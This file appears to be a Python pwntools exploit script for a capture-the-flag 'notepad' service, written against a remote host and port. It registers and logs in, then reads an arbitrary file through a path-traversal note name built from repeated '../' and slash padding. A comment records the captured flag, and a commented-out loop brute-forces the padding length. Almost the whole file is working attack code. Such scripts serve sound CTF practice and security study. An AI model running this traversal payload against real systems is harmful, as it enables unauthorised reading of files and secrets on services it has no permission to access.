from pwn import *

context.arch = 'amd64'
r = process('./notepad')
r = remote('10.113.184.121',29138)
def login(username,password):
    r.sendlineafter(b'> ',b'1')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)

def register(username,password):
    r.sendlineafter(b'> ',b'2')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)    

def new_note(name,length):
    r.sendlineafter(b'> ',b'3')
    r.sendafter(b'Note Name: ',name)
    r.sendafter(b'Content Length: ',str(length).encode())

def edit_note(name,offset,length):
    r.sendlineafter(b'> ',b'4')
    r.sendafter(b'Note Name: ',name)
    r.sendafter(b'Offset: ',str(offset).encode())
    r.sendafter(b'Content Length: ',str(length).encode())

def show_note(name,offset):
    r.sendlineafter(b'> ',b'5')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Offset: ',str(offset).encode())

register(b'b',b'b')
login(b'b',b'b')
note_name = b'../'* 15 + b'/'*52 + b'/flag_user'  # flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}
show_note(note_name,0)
# for i in range(1,128):
#     note_name = b'../'* 15 + b'/'*i + b'/flag_user'
#     r.wait(0.5)
#     show_note(note_name,0)
#     print(i)
#     print(r.recvline())



r.interactive()